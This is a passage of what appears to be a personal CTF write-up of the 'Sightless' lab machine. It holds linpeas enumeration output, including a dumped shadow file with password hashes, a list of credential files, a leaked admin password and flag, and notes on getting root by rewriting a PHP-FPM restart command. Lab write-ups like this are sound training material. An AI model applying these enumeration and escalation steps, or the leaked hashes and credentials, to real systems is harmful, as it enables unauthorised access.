═╣ Can I read shadow files? ............. root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
root:*::
daemon:*::
bin:*::
sys:*::
adm:*::
tty:*::
disk:*::
lp:*::
mail:*::
news:*::
uucp:*::
man:*::
proxy:*::
kmem:*::
dialout:*::
fax:*::
voice:*::
cdrom:*::
floppy:*::
tape:*::
sudo:*::
audio:*::
dip:*::
www-data:*::
backup:*::
operator:*::
list:*::
irc:*::
src:*::
gnats:*::
shadow:*::
utmp:*::
video:*::
sasl:*::
plugdev:*::
staff:*::
games:*::
users:*::
nogroup:*::
node:!::
michael:!::
root:*::
daemon:*::
bin:*::
sys:*::
adm:*::
tty:*::
disk:*::
lp:*::
mail:*::
news:*::
uucp:*::
man:*::
proxy:*::
kmem:*::
dialout:*::
fax:*::
voice:*::
cdrom:*::
floppy:*::
tape:*::
sudo:*::
audio:*::
dip:*::
www-data:*::
backup:*::
operator:*::
list:*::
irc:*::
src:*::
gnats:*::
shadow:*::
utmp:*::
video:*::
sasl:*::
plugdev:*::
staff:*::
games:*::
users:*::
nogroup:*::
node:!::
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. ═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. total 28
drwx------ 1 root root 4096 Aug  9 09:42 .
drwxr-xr-x 1 root root 4096 Aug  2 09:30 ..
lrwxrwxrwx 1 root root    9 Aug  9 09:42 .bash_history -> /dev/null
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4096 Aug  2 09:30 .cache
drwx------ 1 root root 4096 Mar  2  2022 .gnupg
drwxr-xr-x 3 root root 4096 Mar  2  2022 .npm
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/node/.bash_history
/home/michael/.bash_history
/root/
/root/.bashrc
/root/.profile
/root/.bash_history
/root/.cache
/root/.cache/snowflake
/root/.gnupg
/root/.gnupg/random_seed
/root/.gnupg/private-keys-v1.d
/root/.gnupg/pubring.kbx
/root/.gnupg/trustdb.gpg
/root/.gnupg/pubring.kbx~
/root/.gnupg/crls.d
/root/.gnupg/crls.d/DIR.txt
/root/.npm
/root/.npm/_logs
/root/.npm/_logs/2022-03-02T10_06_52_661Z-debug-0.log



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/local/bin/docker-entrypoint.sh

╔══════════╣ Executable files potentially added by user (limit 70)

╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x 1 root root 4096 Mar  2  2022 .
drwxr-xr-x 1 root root 4096 Aug  2 09:30 ..
drwxr-xr-x 4 root root 4096 Mar  2  2022 yarn-v1.22.17

╔══════════╣ Unexpected in root
/.dockerenv
/docker-entrypoint

╔══════════╣ Modified interesting files in the last 5mins (limit 100)


╔══════════╣ Files inside /root (limit 20)
total 28
drwx------ 1 root root 4096 Aug  9 09:42 .
drwxr-xr-x 1 root root 4096 Aug  2 09:30 ..
lrwxrwxrwx 1 root root    9 Aug  9 09:42 .bash_history -> /dev/null
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4096 Aug  2 09:30 .cache
drwx------ 1 root root 4096 Mar  2  2022 .gnupg
drwxr-xr-x 3 root root 4096 Mar  2  2022 .npm
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile

╔══════════╣ Files inside others home (limit 20)
/home/node/.bashrc
/home/node/.profile
/home/node/.bash_logout
/home/michael/.bashrc
/home/michael/.profile
/home/michael/.bash_logout

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup folders
drwxr-xr-x 2 root root 4096 Oct  3  2021 /var/backups
total 0


╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 7138 Mar 12  2022 /usr/app/node_modules/form-data/README.md.bak
-rw-r--r-- 1 root root 12070 Mar 12  2022 /usr/app/node_modules/@azure/core-http/node_modules/form-data/README.md.bak
-rw-r--r-- 1 root root 12070 Mar 12  2022 /usr/app/node_modules/@azure/core-rest-pipeline/node_modules/form-data/README.md.bak
-rw-r--r-- 1 root root 562 Mar 12  2022 /usr/app/node_modules/aws-sdk/clients/backup.js
-rw-r--r-- 1 root root 184148 Mar 12  2022 /usr/app/node_modules/aws-sdk/clients/backup.d.ts
-rw-r--r-- 1 root root 613 Mar 12  2022 /usr/app/node_modules/aws-sdk/clients/backupgateway.js
-rw-r--r-- 1 root root 23597 Mar 12  2022 /usr/app/node_modules/aws-sdk/clients/backupgateway.d.ts
-rw-r--r-- 1 root root 8572 Mar 12  2022 /usr/app/node_modules/aws-sdk/apis/backup-gateway-2021-01-01.min.json
-rw-r--r-- 1 root root 2064 Mar 12  2022 /usr/app/node_modules/aws-sdk/apis/backup-2018-11-15.paginators.json
-rw-r--r-- 1 root root 44 Mar 12  2022 /usr/app/node_modules/aws-sdk/apis/backup-gateway-2021-01-01.examples.json
-rw-r--r-- 1 root root 531 Mar 12  2022 /usr/app/node_modules/aws-sdk/apis/backup-gateway-2021-01-01.paginators.json
-rw-r--r-- 1 root root 65757 Mar 12  2022 /usr/app/node_modules/aws-sdk/apis/backup-2018-11-15.min.json
-rw-r--r-- 1 root root 44 Mar 12  2022 /usr/app/node_modules/aws-sdk/apis/backup-2018-11-15.examples.json
-rw-r--r-- 1 root root 3430 Mar 12  2022 /usr/app/node_modules/sqlite3/build/Release/.deps/Release/obj.target/vscode-sqlite3/src/backup.o.d
-rw-r--r-- 1 root root 165064 Mar 12  2022 /usr/app/node_modules/sqlite3/build/Release/obj.target/vscode-sqlite3/src/backup.o
-rw-r--r-- 1 root root 13613 Mar 12  2022 /usr/app/node_modules/sqlite3/src/backup.cc
-rw-r--r-- 1 root root 7058 Mar 12  2022 /usr/app/node_modules/sqlite3/src/backup.h
-rw-r--r-- 1 root root 11813 Mar 12  2022 /usr/app/node_modules/@types/node-fetch/node_modules/form-data/README.md.bak

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/sqlpad/sqlpad.sqlite


╔══════════╣ Web files?(output limit)

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 220 Apr 18  2019 /etc/skel/.bash_logout
-rw------- 1 root root 0 Feb 28  2022 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 Oct 14  2021 /usr/local/lib/node_modules/npm/.npmrc
-rw-r--r-- 1 root root 279 Feb  8  2022 /usr/local/lib/node_modules/npm/node_modules/typedarray-to-buffer/.airtap.yml
-rw-r--r-- 1 root root 121 Feb  2  2022 /usr/local/lib/node_modules/npm/node_modules/node-gyp/gyp/.flake8
-rw-r--r-- 1 root root 1068 Mar 12  2022 /usr/app/.eslintrc
-rw-r--r-- 1 root root 569 Mar 12  2022 /usr/app/node_modules/clickhouse/node_modules/qs/.editorconfig
-rw-r--r-- 1 root root 956 Mar 12  2022 /usr/app/node_modules/clickhouse/node_modules/qs/.eslintrc
-rw-r--r-- 1 root root 216 Mar 12  2022 /usr/app/node_modules/clickhouse/node_modules/qs/.nycrc
-rw-r--r-- 1 root root 191 Mar 12  2022 /usr/app/node_modules/connect-redis/.eslintrc
-rw-r--r-- 1 root root 37 Mar 12  2022 /usr/app/node_modules/connect-redis/.prettierrc
-rw-r--r-- 1 root root 286 Mar 12  2022 /usr/app/node_modules/object.assign/.editorconfig
-rw-r--r-- 1 root root 590 Mar 12  2022 /usr/app/node_modules/object.assign/.eslintrc
-rw-r--r-- 1 root root 232 Mar 12  2022 /usr/app/node_modules/object.assign/.nycrc
-rw-r--r-- 1 root root 6 Mar 12  2022 /usr/app/node_modules/object.assign/.eslintignore
-rw-r--r-- 1 root root 394 Mar 12  2022 /usr/app/node_modules/snowflake-sdk/.whitesource
-rw-r--r-- 1 root root 715 Mar 12  2022 /usr/app/node_modules/snowflake-sdk/node_modules/https-proxy-agent/.editorconfig
-rw-r--r-- 1 root root 2935 Mar 12  2022 /usr/app/node_modules/snowflake-sdk/node_modules/https-proxy-agent/.eslintrc.js
-rw-r--r-- 1 root root 106 Mar 12  2022 /usr/app/node_modules/snowflake-sdk/.pre-commit-config.yaml
-rw-r--r-- 1 root root 180 Mar 12  2022 /usr/app/node_modules/compression/node_modules/debug/.eslintrc
-rw-r--r-- 1 root root 46 Mar 12  2022 /usr/app/node_modules/compression/node_modules/debug/.coveralls.yml
-rw-r--r-- 1 root root 389 Mar 12  2022 /usr/app/node_modules/es-to-primitive/.eslintrc
-rw-r--r-- 1 root root 1160 Mar 12  2022 /usr/app/node_modules/color-name/.eslintrc.json
-rw-r--r-- 1 root root 286 Mar 12  2022 /usr/app/node_modules/which-boxed-primitive/.editorconfig
-rw-r--r-- 1 root root 89 Mar 12  2022 /usr/app/node_modules/which-boxed-primitive/.eslintrc
-rw-r--r-- 1 root root 216 Mar 12  2022 /usr/app/node_modules/which-boxed-primitive/.nycrc
-rw-r--r-- 1 root root 10 Mar 12  2022 /usr/app/node_modules/which-boxed-primitive/.eslintignore
-rw-r--r-- 1 root root 48 Mar 12  2022 /usr/app/node_modules/express-pino-logger/.taprc
-rw-r--r-- 1 root root 286 Mar 12  2022 /usr/app/node_modules/unbox-primitive/.editorconfig
-rw-r--r-- 1 root root 43 Mar 12  2022 /usr/app/node_modules/unbox-primitive/.eslintrc
-rw-r--r-- 1 root root 216 Mar 12  2022 /usr/app/node_modules/unbox-primitive/.nycrc
-rw-r--r-- 1 root root 10 Mar 12  2022 /usr/app/node_modules/unbox-primitive/.eslintignore
-rw-r--r-- 1 root root 286 Mar 12  2022 /usr/app/node_modules/which-typed-array/.editorconfig
-rw-r--r-- 1 root root 149 Mar 12  2022 /usr/app/node_modules/which-typed-array/.eslintrc
-rw-r--r-- 1 root root 216 Mar 12  2022 /usr/app/node_modules/which-typed-array/.nycrc
-rw-r--r-- 1 root root 10 Mar 12  2022 /usr/app/node_modules/which-typed-array/.eslintignore
-rw-r--r-- 1 root root 102 Mar 12  2022 /usr/app/node_modules/is-weakmap/.eslintrc
-rw-r--r-- 1 root root 68 Mar 12  2022 /usr/app/node_modules/sonic-boom/.taprc
-rw-r--r-- 1 root root 39 Mar 12  2022 /usr/app/node_modules/sonic-boom/.eslintignore
-rw-r--r-- 1 root root 156 Mar 12  2022 /usr/app/node_modules/get-symbol-description/.eslintrc
-rw-r--r-- 1 root root 139 Mar 12  2022 /usr/app/node_modules/get-symbol-description/.nycrc
-rw-r--r-- 1 root root 10 Mar 12  2022 /usr/app/node_modules/get-symbol-description/.eslintignore
-rw-r--r-- 1 root root 1059 Mar 12  2022 /usr/app/node_modules/toposort-class/.eslintrc
-rw-r--r-- 1 root root 91 Mar 12  2022 /usr/app/node_modules/json-schema-traverse/spec/.eslintrc.yml
-rw-r--r-- 1 root root 630 Mar 12  2022 /usr/app/node_modules/json-schema-traverse/.eslintrc.yml
-rw-r--r-- 1 root root 3744 Mar 12  2022 /usr/app/node_modules/mock-require/.eslintrc
-rw-r--r-- 1 root root 279 Mar 12  2022 /usr/app/node_modules/typedarray-to-buffer/.airtap.yml
-rw-r--r-- 1 root root 385 Mar 12  2022 /usr/app/node_modules/is-callable/.editorconfig
-rw-r--r-- 1 root root 993 Mar 12  2022 /usr/app/node_modules/is-callable/.istanbul.yml
-rw-r--r-- 1 root root 294 Mar 12  2022 /usr/app/node_modules/is-callable/.eslintrc
-rw-r--r-- 1 root root 139 Mar 12  2022 /usr/app/node_modules/is-callable/.nycrc
-rw-r--r-- 1 root root 10 Mar 12  2022 /usr/app/node_modules/is-callable/.eslintignore
-rw-r--r-- 1 root root 43 Mar 12  2022 /usr/app/node_modules/is-weakref/.eslintrc
-rw-r--r-- 1 root root 139 Mar 12  2022 /usr/app/node_modules/is-weakref/.nycrc
-rw-r--r-- 1 root root 10 Mar 12  2022 /usr/app/node_modules/is-weakref/.eslintignore
-rw-r--r-- 1 root root 164 Mar 12  2022 /usr/app/node_modules/has-tostringtag/.eslintrc
-rw-r--r-- 1 root root 180 Mar 12  2022 /usr/app/node_modules/send/node_modules/debug/.eslintrc
-rw-r--r-- 1 root root 46 Mar 12  2022 /usr/app/node_modules/send/node_modules/debug/.coveralls.yml
-rw-r--r-- 1 root root 562 Mar 12  2022 /usr/app/node_modules/fast-json-stable-stringify/.eslintrc.yml
-rw-r--r-- 1 root root 540 Mar 12  2022 /usr/app/node_modules/qs/.editorconfig
-rw-r--r-- 1 root root 1022 Mar 12  2022 /usr/app/node_modules/qs/.eslintrc
-rw-r--r-- 1 root root 216 Mar 12  2022 /usr/app/node_modules/qs/.nycrc
-rw-r--r-- 1 root root 692 Mar 12  2022 /usr/app/node_modules/bagpipe/.jshintrc
-rw-r--r-- 1 root root 234 Mar 12  2022 /usr/app/node_modules/events/.zuul.yml
-rw-r--r-- 1 root root 289 Mar 12  2022 /usr/app/node_modules/@azure/storage-blob/node_modules/events/.airtap.yml
-rw-r--r-- 1 root root 289 Mar 12  2022 /usr/app/node_modules/@azure/identity/node_modules/events/.airtap.yml
-rw-r--r-- 1 root root 372 Mar 12  2022 /usr/app/node_modules/requestretry/.editorconfig
-rw-r--r-- 1 root root 5876 Mar 12  2022 /usr/app/node_modules/requestretry/.jshintrc
-rw-r--r-- 1 root root 461 Mar 12  2022 /usr/app/node_modules/requestretry/.checkbuild
-rw-r--r-- 1 root root 368 Mar 12  2022 /usr/app/node_modules/requestretry/.jsbeautifyrc

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 88 Mar  2  2022 /tmp/v8-compile-cache-0/9.4.146.24-node.20/zSoptzSyarn-v1.22.17zSbinzSyarn.js.MAP
-rw-r--r-- 1 root root 2188040 Mar  2  2022 /tmp/v8-compile-cache-0/9.4.146.24-node.20/zSoptzSyarn-v1.22.17zSbinzSyarn.js.BLOB

╔══════════╣ Searching passwords in history files

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password
/usr/app/node_modules/@azure/core-http/dist-esm/src/credentials
/usr/app/node_modules/@azure/core-http/dist-esm/src/credentials/credentials.js
/usr/app/node_modules/@azure/core-http/dist-esm/src/credentials/credentials.js.map
/usr/app/node_modules/@azure/core-http/types/3.1/src/credentials
/usr/app/node_modules/@azure/core-http/types/3.1/src/credentials/credentials.d.ts
/usr/app/node_modules/@azure/core-http/types/latest/src/credentials
/usr/app/node_modules/@azure/core-http/types/latest/src/credentials/credentials.d.ts
/usr/app/node_modules/@azure/core-http/types/latest/src/credentials/credentials.d.ts.map
/usr/app/node_modules/@azure/identity/dist-esm/src/credentials
/usr/app/node_modules/@azure/identity/dist-esm/src/credentials/credentialPersistenceOptions.js
/usr/app/node_modules/@azure/identity/dist-esm/src/credentials/credentialPersistenceOptions.js.map
/usr/app/node_modules/@azure/identity/dist-esm/src/msal/credentials.js
/usr/app/node_modules/@azure/identity/dist-esm/src/msal/credentials.js.map
/usr/app/node_modules/@azure/storage-blob/dist-esm/storage-blob/src/credentials
/usr/app/node_modules/aws-sdk/lib/credentials
/usr/app/node_modules/aws-sdk/lib/credentials.d.ts
/usr/app/node_modules/aws-sdk/lib/credentials.js
/usr/app/node_modules/aws-sdk/lib/credentials/chainable_temporary_credentials.d.ts
/usr/app/node_modules/aws-sdk/lib/credentials/chainable_temporary_credentials.js
/usr/app/node_modules/aws-sdk/lib/credentials/cognito_identity_credentials.d.ts
/usr/app/node_modules/aws-sdk/lib/credentials/cognito_identity_credentials.js
  #)There are more creds/passwds files in the previous parent folder

/usr/app/node_modules/clickhouse/test/cert/server.key
/usr/app/node_modules/google-auth-library/build/src/auth/credentials.d.ts
/usr/app/node_modules/google-auth-library/build/src/auth/credentials.js
/usr/app/node_modules/google-auth-library/build/src/auth/stscredentials.d.ts
/usr/app/node_modules/google-auth-library/build/src/auth/stscredentials.js
  #)There are more creds/passwds files in the previous parent folder

/usr/app/node_modules/mariadb/lib/cmd/handshake/auth/clear-password-auth.js
/usr/app/node_modules/mariadb/lib/cmd/handshake/auth/ed25519-password-auth.js
/usr/app/node_modules/mariadb/lib/cmd/handshake/auth/native-password-auth.js
  #)There are more creds/passwds files in the previous parent folder

/usr/app/node_modules/mysql2/lib/auth_plugins/caching_sha2_password.md
/usr/app/node_modules/mysql2/lib/auth_plugins/mysql_native_password.js
/usr/app/node_modules/mysql2/lib/auth_plugins/sha256_password.js
  #)There are more creds/passwds files in the previous parent folder

/usr/app/node_modules/webfinger/test/data/localhost.key
/usr/app/routes/password-reset.js
/usr/app/test/api/password-reset.js
/usr/share/pam/common-password
/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r'
```

### SSH
Note: root is only root on the docker
![sightless-2](/images/sightless/Pasted image 20240924125720.png)

now we have user.txt: 1fa0849f56a2a21b8dc4416ab1b20b84

## 6: Obtain root.txt

Found from linpeas that there is a connection on 8080 on the target machine so port forward to obtain this webpage



Now port forward

![sightless-3](/images/sightless/Pasted image 20240924134041.png)

![sightless-4](/images/sightless/Pasted image 20240924134032.png)


Inspect this page now, nothing here, since there was this from linpeas
![sightless-5](#missing/WhatsApp Image 2024-09-24 at 13.06.35_30bfd38d.jpg)

now go to the page through chrome, since wifi is very slow, I can't download chrome: 
username: admin
password: ForlorfroxAdmin

![sightless-5](/home/husmal/Documents/projects/Vaults to migrate From/CTF & Machines & Rooms/WhatsApp Video 2024-09-24 at 14.25.24_9f4bcd8b.mp4)
(We have to use chrome remote debugger)

![sightless-5](/images/sightless/Pasted image 20240924143212.png)

Now we have to obtain a reverse shell in some way, or obtain an admin shell

Tried to download json revrse shell in the settings:
![sightless-6](/images/sightless/Pasted image 20240924150233.png)

but didn't work

Then enable PHP-FPM, and go to the configuration

![sightless-7](/images/sightless/Pasted image 20240924151238.png)

and change the fpm restart command

changed it to cp /root /tmp/root but didn't work even after restart of the service.

It seems like it is not restarting, so checked walkthrough and there is already the rsa key of the root user in the /tmp folder

![sightless-8](/images/sightless/Pasted image 20240924152624.png)
Note that the above command is wrong, I should have added cp -r


Machine pawned
